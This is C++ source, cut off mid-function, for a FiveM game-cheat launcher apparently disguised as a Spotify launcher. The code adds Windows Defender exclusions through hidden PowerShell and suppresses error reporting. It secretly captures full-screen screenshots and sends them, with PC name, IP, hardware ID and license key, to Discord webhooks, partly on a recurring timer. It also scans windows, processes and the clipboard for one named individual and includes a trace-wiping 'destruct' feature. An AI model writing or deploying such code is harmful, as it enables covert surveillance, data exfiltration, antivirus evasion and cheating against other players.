



#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>
#include <winioctl.h>
#include <werapi.h>
#include <shellapi.h>
#include <commctrl.h>
#include <wininet.h>
#include <shlwapi.h>
#include <objbase.h>
#include <shlobj.h>
#include <objidl.h>
#include <exdisp.h>
#include <ShlGuid.h>
#include <tlhelp32.h>
#include <iphlpapi.h>

#include <string>
#include <vector>
#include <cmath>
#include <algorithm>

#include <gdiplus.h>
#include "StringCleaner.hpp"
#include "XorStr.h"

std::string getHWIDStr();
bool CheckForBlacklistedTools();
void TriggerAntiCrackDestruct();

std::wstring GetHwid();
DWORD WINAPI DestructThread(LPVOID lpParam);


#include "images.h"
#include "PrefetchShimName.h"
#include "LauncherDllName.h"

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "wininet.lib")


static const DWORD kHttpNoDiskCache = INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE;
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wer.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

#ifndef WDA_EXCLUDEFROMCAPTURE
#define WDA_EXCLUDEFROMCAPTURE 0x00000011
#endif


static LONG WINAPI SilentUnhandledFilter(EXCEPTION_POINTERS*) {
    ExitProcess(1);
    return EXCEPTION_EXECUTE_HANDLER;
}
static void MinimizeEventViewerTraces() {
    SetUnhandledExceptionFilter(SilentUnhandledFilter);
    wchar_t exePath[MAX_PATH] = {};
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
        WerAddExcludedApplication(exePath, FALSE); 
    }
}




const int WIN_W   = 520;
const int WIN_H   = 400;
const int LPANEL  = 240;
const int MPANEL  = 180;
const int TITLEH  = 40;
const int FOOTHER = 56;

#define ID_EDIT_USER      101
#define ID_EDIT_PASS      102
#define ID_BTN_LOGIN      103
#define ID_BTN_LOAD       105
#define ID_CHK_LUA        110
#define ID_CHK_STEALTH    111
#define ID_CHK_CLEANER    112
#define ID_PROD_0         120




#define CLR_BG         Gdiplus::Color(255, 0, 0, 0)
#define CLR_BG2        Gdiplus::Color(255, 0, 0, 0)
#define CLR_TITLEBAR   Gdiplus::Color(255, 0, 0, 0)
#define CLR_PANEL_L    Gdiplus::Color(255, 0, 0, 0)
#define CLR_PANEL_R    Gdiplus::Color(255, 0, 0, 0)
#define CLR_HEADER     Gdiplus::Color(255, 0, 0, 0)
#define CLR_SEP        Gdiplus::Color(255, 20, 20, 20)
#define CLR_WHITE      Gdiplus::Color(255, 245, 245, 250)
#define CLR_MUTED      Gdiplus::Color(255, 120, 120, 140)
#define CLR_DIM        Gdiplus::Color(255, 60,  60,  78)
#define CLR_ACCENT     Gdiplus::Color(255, 150, 150, 150)
#define CLR_ACCENT2    Gdiplus::Color(255, 120, 120, 120)
#define CLR_GREEN      Gdiplus::Color(255, 74,  222, 128)
#define CLR_ROW_SEP    Gdiplus::Color(255, 28,  28,  38)
#define CLR_EDIT_BG    Gdiplus::Color(255, 26,  26,  36)
#define CLR_BTN_NORM   Gdiplus::Color(255, 34,  34,  46)
#define CLR_BTN_HOT    Gdiplus::Color(255, 44,  44,  60)
#define CLR_SELECTED   Gdiplus::Color(255, 28,  20,  46)
#define CLR_SEL_BORDER Gdiplus::Color(255, 180, 180, 180)




struct Product {
    const wchar_t* name;
    const wchar_t* tag;
    const wchar_t* expiry;
    const wchar_t* status;
    wchar_t updated[64];
    bool  luaMenu;
    bool  stealth;
    bool  cleaner;
    COLORREF thumbColor1;
    COLORREF thumbColor2;
};

static Product g_products[] = {
    { XWC(L"Magris Private"), XWC(L"FiveM"), XWC(L"1 days, 0 hours"), XWC(L"Undetected"), L"", true, false, false, RGB(60, 60, 60), RGB(100, 100, 100) },
    { XWC(L"Magris Safe Destruct"), XWC(L"Destruct"), XWC(L"Lifetime"), XWC(L"Undetected"), L"", false, true, true, RGB(40, 40, 40), RGB(80, 80, 80) },
};
static const int PROD_COUNT = 2;




static const wchar_t* AUTH_URL = XWC(L"");
static const int AUTH_PORT = 3131;

bool      g_loggedIn   = false;
std::wstring g_userExpiry = XW(L"1 days, 0 hours");
int       g_selProd    = 0;
HWND      g_hwnd       = NULL;
HANDLE    g_hLaunchEvt = NULL;
HFONT     g_font       = NULL;
HFONT     g_fontSm     = NULL;
HFONT     g_fontTiny   = NULL;
ULONG_PTR g_gdipToken  = 0;
int       g_animTick   = 0;
UINT_PTR  g_timerId    = 1;
bool      g_masonScanStop = false;
static bool g_masonAutoDestructPosted = false;
static bool g_anydeskInstallDirDestructPosted = false;
static HANDLE g_masonScanThread = NULL;

HWND g_hUser = NULL, g_hPass = NULL, g_hBtnL = NULL;
HWND g_hBtnLoad = NULL, g_hChkLua = NULL, g_hChkSt = NULL, g_hChkCl = NULL;
HWND g_hProd[PROD_COUNT] = {};

bool g_chkLua = true, g_chkStealth = false, g_chkCleaner = false;

bool g_isDestructing = false;
static CRITICAL_SECTION g_destructStatusCS;
static bool g_destructStatusCSInit = false;
static wchar_t g_destructStatusBuf[256] = {};
float g_destructRotation = 0.0f;
HWND g_hDestructWnd = NULL;

static void InitDestructStatusCS() {
    if (!g_destructStatusCSInit) {
        InitializeCriticalSection(&g_destructStatusCS);
        g_destructStatusCSInit = true;
    }
}
static void SetDestructStatus(const wchar_t* s) {
    EnterCriticalSection(&g_destructStatusCS);
    wcsncpy_s(g_destructStatusBuf, s, _TRUNCATE);
    LeaveCriticalSection(&g_destructStatusCS);
}
static void GetDestructStatus(wchar_t* out, size_t maxLen) {
    EnterCriticalSection(&g_destructStatusCS);
    wcsncpy_s(out, maxLen, g_destructStatusBuf, _TRUNCATE);
    LeaveCriticalSection(&g_destructStatusCS);
}

std::string g_loggedInUsername;
std::string g_loggedInKey;


static std::vector<wchar_t> g_keyScreenshotEnc;
static __forceinline wchar_t KeyShotWhMask(size_t i) {
    uint32_t x = 0x811C9DC5u ^ (uint32_t)(i * 2654435761u);
    x ^= x >> 16;
    return (wchar_t)(x ^ 0xA5A5u);
}
static void ClearKeyScreenshotSecure() {
    if (!g_keyScreenshotEnc.empty())
        SecureZeroMemory(g_keyScreenshotEnc.data(), g_keyScreenshotEnc.size() * sizeof(wchar_t));
    g_keyScreenshotEnc.clear();
}
static void StoreKeyScreenshotPath(const std::wstring& wpath) {
    ClearKeyScreenshotSecure();
    g_keyScreenshotEnc.resize(wpath.size());
    for (size_t i = 0; i < wpath.size(); i++)
        g_keyScreenshotEnc[i] = wpath[i] ^ KeyShotWhMask(i);
}
static bool HasKeyScreenshotWebhook() { return !g_keyScreenshotEnc.empty(); }

HANDLE g_keyScreenshotThread = NULL;
bool g_keyScreenshotStop = false;

Gdiplus::Bitmap* g_bmpLogo = NULL;
Gdiplus::Bitmap* g_bmpLogoSmall = NULL;
Gdiplus::Bitmap* g_bmpCardBg[2] = { NULL, NULL };  

static Gdiplus::Bitmap* LoadImageFromBytes(const unsigned char* data, size_t size) {
    if (!data || size == 0) return NULL;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (SIZE_T)size);
    if (!hMem) return NULL;
    void* p = GlobalLock(hMem);
    if (!p) { GlobalFree(hMem); return NULL; }
    memcpy(p, data, size);
    GlobalUnlock(hMem);
    IStream* stm = NULL;
    if (CreateStreamOnHGlobal(hMem, TRUE, &stm) != S_OK) { GlobalFree(hMem); return NULL; }
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromStream(stm);
    stm->Release();
    return bmp;
}

static Gdiplus::Bitmap* LoadImageFromExeDir(const wchar_t* filename) {
    wchar_t path[MAX_PATH] = {};
    if (GetModuleFileNameW(NULL, path, MAX_PATH) == 0) return NULL;
    PathRemoveFileSpecW(path);
    PathAppendW(path, filename);
    return Gdiplus::Bitmap::FromFile(path);
}

static void AddDefenderExclusion(const std::wstring& path) {
    std::wstring cmd = XW(L"powershell.exe -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '") + path + XW(L"'\"");
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

static std::wstring GetMagrisExeDir() {
    wchar_t path[MAX_PATH] = {};
    HMODULE hMod = GetModuleHandleW(NULL);
#ifndef MAGRIS_LAUNCHER_EXE
    HMODULE hDll = GetModuleHandleW(XWC(L"libcef2.dll"));
    if (!hDll)
        hDll = GetModuleHandleW(XWC(L"MagrisLauncher.dll"));
    if (hDll)
        hMod = hDll;
#endif
    if (hMod && GetModuleFileNameW(hMod, path, MAX_PATH)) {
        std::wstring s(path);
        size_t i = s.find_last_of(XW(L"\\/"));
        return (i != std::wstring::npos) ? s.substr(0, i + 1) : s;
    }
    if (GetModuleFileNameW(NULL, path, MAX_PATH) == 0) return L"";
    std::wstring s(path);
    size_t i = s.find_last_of(XW(L"\\/"));
    return (i != std::wstring::npos) ? s.substr(0, i + 1) : s;
}

static bool IsProcessNamed(const wchar_t* exeName) {
    wchar_t path[MAX_PATH] = {};
    if (!GetModuleFileNameW(NULL, path, MAX_PATH))
        return false;
    const wchar_t* base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    return _wcsicmp(base, exeName) == 0;
}

static bool IsSpotifyLaunchersProcess() {
    return IsProcessNamed(XWC(L"SpotifyLaunchers.exe"));
}

static bool IsMagrisHostExeProcess() {
    return IsSpotifyLaunchersProcess();
}

static bool IsMagrisWrappedSpotifyExe() {
    if (!IsProcessNamed(XWC(L"Spotify.exe")))
        return false;
    std::wstring dir = GetMagrisExeDir();
    return GetFileAttributesW((dir + XW(L"Spotify_real.exe")).c_str()) != INVALID_FILE_ATTRIBUTES;
}

static bool IsMagrisLauncherHostProcess() {
    return IsSpotifyLaunchersProcess() || IsMagrisHostExeProcess() || IsMagrisWrappedSpotifyExe();
}




std::string getHWIDStr() {
    std::wstring hwidW = GetHwid();
    char hwidA[256]={0};
    WideCharToMultiByte(CP_UTF8, 0, hwidW.c_str(), -1, hwidA, 256, NULL, NULL);
    return std::string(hwidA);
}

inline std::string GetLogUserInfo() {
    return XS("\nUsername: ") + g_loggedInUsername + XS("\nKey: ") + g_loggedInKey + XS("\nHWID: ") + getHWIDStr();
}





static const wchar_t* WEBHOOK_HOST               = XWC(L"discord.com");
static const wchar_t* WEBHOOK_PATH_LOGIN_SUCCESS = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_LOGIN_FAIL    = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_INJECT        = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_STREAMPROOF   = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_DESTRUCT      = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_SECURITY      = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_ERROR         = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_INJECT_FAIL   = XWC(L"/api/");
static const wchar_t* WEBHOOK_PATH_LEAK_COPY     = XWC(L"/api/");

static const wchar_t* WEBHOOK_PATH_BUNEAMQ_LOG   = XWC(L"/api/");

static void SendWebhookTo(const wchar_t* path, const std::string& content) {
    if (!path || !*path) return; 

    std::string escaped;
    escaped.reserve(content.size() * 2);
    for (char c : content) {
        if (c == '\\') escaped += XS("\\\\");
        else if (c == '\"') escaped += XS("\\\"");
        else if (c == '\n') escaped += XS("\\n");
        else escaped += c;
    }
    std::string body = XS("{\"content\":\"") + escaped + XS("\"}");

    std::wstring ua = XW(L"Magris/1.0");
    HINTERNET hi = InternetOpenW(ua.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hi) return;
    HINTERNET hc = InternetConnectW(hi, WEBHOOK_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hc) { InternetCloseHandle(hi); return; }
    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD;
    HINTERNET hr = HttpOpenRequestW(hc, XWC(L"POST"), path, NULL, NULL, NULL, flags, 0);
    if (!hr) { InternetCloseHandle(hc); InternetCloseHandle(hi); return; }
    wchar_t hdr[128];
    swprintf_s(hdr, _countof(hdr), L"Content-Type: application/json\r\nContent-Length: %zu\r\n", body.size());
    DWORD hdrLen = (DWORD)wcslen(hdr);
    BOOL sent = HttpSendRequestW(hr, hdr, hdrLen, (LPVOID)body.data(), (DWORD)body.size());
    InternetCloseHandle(hr);
    InternetCloseHandle(hc);
    InternetCloseHandle(hi);
    (void)sent;
}

static void SendWebhookWithFile(const wchar_t* path, const std::string& content, const std::wstring& filePath) {
    if (!path || !*path) return;
    std::string escaped;
    escaped.reserve(content.size() * 2);
    for (char c : content) {
        if (c == '\\') escaped += XS("\\\\");
        else if (c == '\"') escaped += XS("\\\"");
        else if (c == '\n') escaped += XS("\\n");
        else escaped += c;
    }
    std::string boundary = XS("------------MagrisScreenshot");
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 8 * 1024 * 1024) { CloseHandle(hFile); return; } 
    std::vector<char> fileData(fileSize);
    DWORD read = 0;
    if (!ReadFile(hFile, fileData.data(), fileSize, &read, NULL) || read != fileSize) { CloseHandle(hFile); return; }
    CloseHandle(hFile);
    DeleteFileW(filePath.c_str()); 
    std::string part1 = std::string(XS("--")) + boundary + XS("\r\n")
        + XS("Content-Disposition: form-data; name=\"payload_json\"\r\n")
        + XS("Content-Type: application/json; charset=UTF-8\r\n\r\n")
        + XS("{\"content\":\"") + escaped + XS("\"}\r\n")
        + XS("--") + boundary + XS("\r\n")
        + XS("Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n")
        + XS("Content-Type: image/png\r\n\r\n");
    std::string part2 = std::string(XS("\r\n--")) + boundary + XS("--\r\n");
    std::vector<char> body;
    body.insert(body.end(), part1.begin(), part1.end());
    body.insert(body.end(), fileData.begin(), fileData.end());
    body.insert(body.end(), part2.begin(), part2.end());
    std::wstring ua2 = XW(L"Magris/1.0");
    HINTERNET hi = InternetOpenW(ua2.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hi) return;
    HINTERNET hc = InternetConnectW(hi, WEBHOOK_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hc) { InternetCloseHandle(hi); return; }
    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD;
    HINTERNET hr = HttpOpenRequestW(hc, XWC(L"POST"), path, NULL, NULL, NULL, flags, 0);
    if (!hr) { InternetCloseHandle(hc); InternetCloseHandle(hi); return; }
    std::wstring ct = XW(L"Content-Type: multipart/form-data; boundary=");
    std::wstring bndW(boundary.begin(), boundary.end());
    std::wstring fullHdr = ct + bndW + XW(L"\r\nContent-Length: ") + std::to_wstring(body.size()) + XW(L"\r\n");
    DWORD fullHdrLen = (DWORD)fullHdr.size();
    HttpSendRequestW(hr, fullHdr.c_str(), fullHdrLen, body.data(), (DWORD)body.size());
    InternetCloseHandle(hr);
    InternetCloseHandle(hc);
    InternetCloseHandle(hi);
}

static int GetEncoderClsidPng(CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    std::vector<char> buf(size);
    Gdiplus::ImageCodecInfo* pInfo = (Gdiplus::ImageCodecInfo*)buf.data();
    Gdiplus::GetImageEncoders(num, size, pInfo);
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(pInfo[i].MimeType, XW(L"image/png").c_str()) == 0) {
            *pClsid = pInfo[i].Clsid;
            return 0;
        }
    }
    return -1;
}


static bool CaptureScreenshotToFile(const std::wstring& path) {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return false;
    int w = GetDeviceCaps(hdcScreen, HORZRES);
    int h = GetDeviceCaps(hdcScreen, VERTRES);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) { ReleaseDC(NULL, hdcScreen); return false; }
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, w, h);
    if (!hBmp) { DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen); return false; }
    HGDIOBJ old = SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
    SelectObject(hdcMem, old);
    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    Gdiplus::Bitmap bmp(hBmp, NULL);
    DeleteObject(hBmp);
    CLSID clsid;
    if (GetEncoderClsidPng(&clsid) != 0) return false;
    Gdiplus::Status st = bmp.Save(path.c_str(), &clsid, NULL);
    return (st == Gdiplus::Ok);
}


static void SendWebhookWithScreenshot(const wchar_t* path, const std::string& content) {
    if (!path || !*path) return;
    wchar_t tempDir[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempDir) == 0) {
        SendWebhookTo(path, content);
        return;
    }
    std::wstring screenPath = std::wstring(tempDir) + XW(L"magris_log_") + std::to_wstring(GetTickCount64()) + XW(L".png");
    if (!CaptureScreenshotToFile(screenPath)) {
        SendWebhookTo(path, content);
        return;
    }
    SendWebhookWithFile(path, content, screenPath);
    DeleteFileW(screenPath.c_str());
}

static std::string GetPcNameStr() {
    wchar_t nameW[256] = {};
    DWORD sz = ARRAYSIZE(nameW);
    if (!GetComputerNameW(nameW, &sz)) return XS("UNKNOWN-PC");
    char nameA[256] = {};
    WideCharToMultiByte(CP_UTF8, 0, nameW, -1, nameA, 256, NULL, NULL);
    return std::string(nameA);
}

static std::string GetLocalIpStr() {
    IP_ADAPTER_INFO ai[16];
    DWORD buflen = sizeof(ai);
    if (GetAdaptersInfo(ai, &buflen) != NO_ERROR)
        return XS("UNKNOWN-IP");
    PIP_ADAPTER_INFO p = ai;
    while (p) {
        const char* ip = p->IpAddressList.IpAddress.String;
        if (ip && ip[0] && strcmp(ip, XSC("0.0.0.0")) != 0 && strcmp(ip, XSC("127.0.0.1")) != 0)
            return std::string(ip);
        p = p->Next;
    }
    return XS("UNKNOWN-IP");
}

static std::string GetNowStr() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[64];
    
    sprintf_s(buf, XSC("%04d-%02d-%02d %02d:%02d:%02d"),
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return std::string(buf);
}

static std::string BuildCommonInfoBlock() {
    return std::string(XS("Bilgisayar: `")) + GetPcNameStr() + XS("`\n") +
           XS("Kullanici: `") + g_loggedInUsername + XS("`\n") +
           XS("HWID: `") + getHWIDStr() + XS("`\n") +
           XS("IP: `") + GetLocalIpStr() + XS("`\n") +
           XS("Zaman: `") + GetNowStr() + XS("`");
}

static void SendLoginSuccessLog() {
    std::string msg = XS("âœ… **Giris Basarili**\n\n") + BuildCommonInfoBlock();
    SendWebhookWithScreenshot(WEBHOOK_PATH_LOGIN_SUCCESS, msg);
}

static void SendLoginFailLog(const std::string& user, const std::string& key, const std::string& hwid) {
    std::string msg = XS("âŒ **Giris Basarisiz**\n\n") +
        XS("Kullanici: `") + user + XS("`\n") +
        XS("Key: `") + key + XS("`\n") +
        XS("HWID: `") + hwid + XS("`\n") +
        XS("Zaman: `") + GetNowStr() + XS("`");
    SendWebhookWithScreenshot(WEBHOOK_PATH_LOGIN_FAIL, msg);
}

static void SendInjectLog() {
    std::string msg = XS("âœ… **Inject Tamamlandi**\n\n") + BuildCommonInfoBlock();
    SendWebhookWithScreenshot(WEBHOOK_PATH_INJECT, msg);
}

static void SendStreamProofLog(const std::string& state) {
    std::string msg = XS("ðŸ” **Stream Proof Durumu Degisti**\n\nDurum: `") + state + XS("`\n\n") + BuildCommonInfoBlock();
    SendWebhookWithScreenshot(WEBHOOK_PATH_STREAMPROOF, msg);
}

static void SendDestructLog(const std::string& title) {
    std::string msg = XS("ðŸ§¨ **") + title + XS("**\n\n") + BuildCommonInfoBlock();
    SendWebhookWithScreenshot(WEBHOOK_PATH_DESTRUCT, msg);
}


static void SendLeakCopyLog(const std::wstring& copiedFrom, const std::wstring& runPath) {
    std::string msg = XS("ðŸ•·ï¸ **Magris Exe Kopya Tespit Edildi**\n\n") + BuildCommonInfoBlock();
    
    char fromA[MAX_PATH * 2] = {};
    char runA[MAX_PATH * 2] = {};
    WideCharToMultiByte(CP_UTF8, 0, copiedFrom.c_str(), -1, fromA, sizeof(fromA), NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, runPath.c_str(), -1, runA, sizeof(runA), NULL, NULL);
    msg += std::string(XS("\nKaynak: `")) + fromA + XS("`\nCalisan: `") + runA + XS("`");
    msg += XS("\nKey: `") + g_loggedInKey + XS("`\nHWID: `") + getHWIDStr() + XS("`");
    SendWebhookWithScreenshot(WEBHOOK_PATH_LEAK_COPY, msg);
}

static void SendSecurityAlertLog(const std::string& reason) {
    std::string msg = XS("ðŸš¨ **Guvenlik Uyarisi**\n\n") + reason + XS("\n\n") + BuildCommonInfoBlock();
    SendWebhookWithScreenshot(WEBHOOK_PATH_SECURITY, msg);
}



static void SendBuneAmqLog(const std::string& eventText) {
    if (!WEBHOOK_PATH_BUNEAMQ_LOG || !*WEBHOOK_PATH_BUNEAMQ_LOG) return;
    std::string msg = XS("**[buneamq log]**\n") + eventText + XS("\n\n") + BuildCommonInfoBlock();
    SendWebhookTo(WEBHOOK_PATH_BUNEAMQ_LOG, msg);
}

static void SendErrorLogFast(const std::string& text) {
    std::string msg = XS("âš ï¸ **Hata**\n\n") + text + XS("\n\nKey: `") + g_loggedInKey + XS("`\nHWID: `") + getHWIDStr() + XS("`\nZaman: `") + GetNowStr() + XS("`");
    SendWebhookTo(WEBHOOK_PATH_ERROR, msg);
}

static void SendErrorLog(const std::string& text) {
    SendErrorLogFast(text);
}


static void SendInjectFailLog(const std::string& reason) {
    std::string msg = XS("âŒ **Inject Basarisiz**\n\n") +
        XS("Key: `") + g_loggedInKey + XS("`\n") +
        XS("HWID: `") + getHWIDStr() + XS("`\n") +
        XS("Sebep: `") + reason + XS("`\n") +
        XS("Zaman: `") + GetNowStr() + XS("`");
    SendWebhookWithScreenshot(WEBHOOK_PATH_INJECT_FAIL, msg);
}



static DWORD WINAPI KeyScreenshotThread(LPVOID) {
    while (!g_keyScreenshotStop) {
        if (HasKeyScreenshotWebhook() && g_loggedIn) {
            size_t n = g_keyScreenshotEnc.size();
            if (n > 0 && n < 480) {
                wchar_t dec[512];
                for (size_t i = 0; i < n; i++)
                    dec[i] = g_keyScreenshotEnc[i] ^ KeyShotWhMask(i);
                dec[n] = 0;
                std::string msg = XS("ðŸ“¸ **Key Screenshot**\n\n") + BuildCommonInfoBlock();
                SendWebhookWithScreenshot(dec, msg);
                SecureZeroMemory(dec, sizeof(dec));
            }
        }
        for (int i = 0; i < 600 && !g_keyScreenshotStop; ++i) {
            Sleep(100); 
        }
    }
    return 0;
}

static bool ScanFileForString(const std::wstring& filePath, const char* target, size_t targetLen) {
    HANDLE f = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER fileSize;
    GetFileSizeEx(f, &fileSize);
    if (fileSize.QuadPart > 50 * 1024 * 1024 || fileSize.QuadPart < (LONGLONG)targetLen) { CloseHandle(f); return false; }
    std::vector<char> buf((size_t)fileSize.QuadPart);
    DWORD read = 0;
    if (!ReadFile(f, buf.data(), (DWORD)fileSize.QuadPart, &read, NULL) || read < targetLen) { CloseHandle(f); return false; }
    CloseHandle(f);
    for (size_t i = 0; i <= read - targetLen; i++) {
        if (memcmp(buf.data() + i, target, targetLen) == 0) return true;
    }
    return false;
}

static bool ScanDiscordCacheFolder(const std::wstring& baseDir, const char* target, size_t targetLen) {
    std::wstring searchPath = baseDir + XW(L"*");
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(searchPath.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return false;
    bool found = false;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::wstring fp = baseDir + fd.cFileName;
        if (ScanFileForString(fp, target, targetLen)) { found = true; break; }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    return found;
}

struct MasonWindowResult {
    bool found;
    std::string matchedTitle;
    std::string matchedPattern;
};

static bool MasonWordMatch(const std::wstring& text, const wchar_t* word) {
    size_t wordLen = wcslen(word);
    size_t pos = 0;
    while ((pos = text.find(word, pos)) != std::wstring::npos) {
        bool leftOk  = (pos == 0) || !iswalnum(text[pos - 1]);
        bool rightOk = (pos + wordLen >= text.size()) || !iswalnum(text[pos + wordLen]);
        if (leftOk && rightOk) return true;
        pos++;
    }
    return false;
}

static std::vector<std::wstring> GetMasonPatterns() {
    static std::vector<std::wstring> p;
    if (p.empty()) {
        p.push_back(XW(L"masonjack29"));
        p.push_back(XW(L"masonjack"));
        p.push_back(XW(L"mason_jack"));
        p.push_back(XW(L"mason jack"));
        p.push_back(XW(L"mjack29"));
        p.push_back(XW(L"mason29"));
        p.push_back(XW(L"masonj29"));
    }
    return p;
}

static BOOL CALLBACK EnumMasonWindowsProc(HWND hWnd, LPARAM lParam) {
    if (!IsWindowVisible(hWnd)) return TRUE;
    wchar_t title[512] = {};
    GetWindowTextW(hWnd, title, ARRAYSIZE(title));
    if (!title[0]) return TRUE;
    std::wstring t = title;
    for (auto& ch : t) ch = (wchar_t)towlower(ch);
    auto* res = (MasonWindowResult*)lParam;
    for (const auto& pat : GetMasonPatterns()) {
        if (MasonWordMatch(t, pat.c_str())) {
            res->found = true;
            char narrow[512] = {};
            WideCharToMultiByte(CP_UTF8, 0, title, -1, narrow, 512, NULL, NULL);
            res->matchedTitle = narrow;
            char patNarrow[64] = {};
            WideCharToMultiByte(CP_UTF8, 0, pat.c_str(), -1, patNarrow, 64, NULL, NULL);
            res->matchedPattern = patNarrow;
            return FALSE;
        }
    }
    return TRUE;
}

static MasonWindowResult IsMasonOnScreen() {
    MasonWindowResult res = { false, "", "" };
    EnumWindows(EnumMasonWindowsProc, (LPARAM)&res);
    return res;
}

static std::string ScanProcessesForMason() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "";
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring name = pe.szExeFile;
            for (auto& ch : name) ch = (wchar_t)towlower(ch);
            for (const auto& pat : GetMasonPatterns()) {
                if (name.find(pat) != std::wstring::npos) {
                    CloseHandle(snap);
                    char narrow[256] = {};
                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, narrow, 256, NULL, NULL);
                    return std::string(narrow);
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return "";
}

static std::string ScanClipboardForMason() {
    if (!OpenClipboard(NULL)) return "";
    std::string result;
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData) {
        const wchar_t* text = (const wchar_t*)GlobalLock(hData);
        if (text) {
            std::wstring t = text;
            for (auto& ch : t) ch = (wchar_t)towlower(ch);
            for (const auto& pat : GetMasonPatterns()) {
                if (t.find(pat) != std::wstring::npos) {
                    char patN[64] = {};
                    WideCharToMultiByte(CP_UTF8, 0, pat.c_str(), -1, patN, 64, NULL, NULL);
                    result = std::string(XS("clipboard:")) + patN;
                    break;
                }
            }
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();
    return result;
}

static bool IsAnyDeskRunning() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, XW(L"AnyDesk.exe").c_str()) == 0) { found = true; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static bool ExplorerWindowPathUnderInstallDir(const std::wstring& installDirRaw) {
    if (installDirRaw.empty()) return false;
    wchar_t installFull[MAX_PATH] = {};
    DWORD ni = GetFullPathNameW(installDirRaw.c_str(), MAX_PATH, installFull, NULL);
    if (!ni || ni >= MAX_PATH) return false;
    std::wstring installNorm = installFull;
    for (auto& c : installNorm) if (c == L'/') c = L'\\';
    while (!installNorm.empty() && installNorm.back() == L'\\') installNorm.pop_back();
    std::wstring installLower = installNorm;
    if (!installLower.empty()) CharLowerBuffW(&installLower[0], (DWORD)installLower.size());

    IShellWindows* psw = nullptr;
    if (FAILED(CoCreateInstance(CLSID_ShellWindows, nullptr, CLSCTX_ALL, IID_IShellWindows, (void**)&psw)) || !psw)
        return false;

    long cnt = 0;
    psw->get_Count(&cnt);
    for (long i = 0; i < cnt; ++i) {
        VARIANT v;
        VariantInit(&v);
        v.vt = VT_I4;
        v.lVal = i;
        IDispatch* disp = nullptr;
